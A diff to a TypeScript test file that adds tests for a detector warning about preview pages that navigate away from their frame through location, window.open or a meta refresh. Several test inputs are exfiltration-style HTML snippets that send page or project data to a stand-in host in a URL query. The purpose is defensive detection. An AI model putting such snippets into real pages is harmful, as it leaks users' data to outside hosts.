@@ -8,6 +8,7 @@ import {
   ReportAssets,
   blockedExternals,
   decodeBase64,
+  navigationWarnings,
   referencedPaths,
   scheduleAssetPurge,
 } from './report.js';
@@ -516,6 +517,47 @@ describe('page checks (view_preview, R13)', () => {
     );
     expect(draft.warnings.join('\n')).toMatch(/No dark colours/);
     expect(draft.warnings.join('\n')).toMatch(/No summary/);
+  });
+});
+
+describe('pages that try to leave their frame (view_preview, R13.6)', () => {
+  it('warns on scripts that set location, call window.open, and on a meta refresh', () => {
+    const cases: [string, RegExp | null][] = [
+      ['<script>location.href = "https://x.example/?d=" + rows</script>', /sets location/],
+      ["<script>window.location = 'https://x.example'</script>", /sets location/],
+      ['<script>location="https://x.example"</script>', /sets location/],
+      ['<script>top.location.href="https://x.example"</script>', /sets location/],
+      ['<script>location.assign(u)</script>', /sets location/],
+      ['<script>document.location.replace(u)</script>', /sets location/],
+      ['<button onclick="location.href=\'https://x.example\'">go</button>', /sets location/],
+      ['<script>window.open("https://x.example")</script>', /window\.open/],
+      [
+        '<meta http-equiv="Refresh" content="0;url=https://x.example">',
+        /meta http-equiv="refresh"/,
+      ],
+      // Reading or comparing location is fine, and so is prose about it.
+      ['<script>if (location.href == x) show(location.hash)</script>', null],
+      ['<p>Set location.href = "x" to move; call window.open(url)</p>', null],
+      ['<a href="https://x.example">a plain link</a>', null],
+    ];
+    for (const [html, expected] of cases) {
+      const warnings = navigationWarnings(html);
+      if (expected) expect(warnings.join('\n'), html).toMatch(expected);
+      else expect(warnings, html).toEqual([]);
+    }
+  });
+
+  it('view_preview shows them, pointing to plain links and pharos.openLink', () => {
+    const { store, projectId } = setup();
+    const preview = previewAny(store, {
+      projectId,
+      page: {
+        html: '<script>pharos.data("x").then(r => { location.href = "https://x.example/?d=" + r })</script>',
+      },
+    });
+    const text = preview.warnings.join('\n');
+    expect(text).toMatch(/sets location/);
+    expect(text).toContain('pharos.openLink(url)');
   });
 });
 
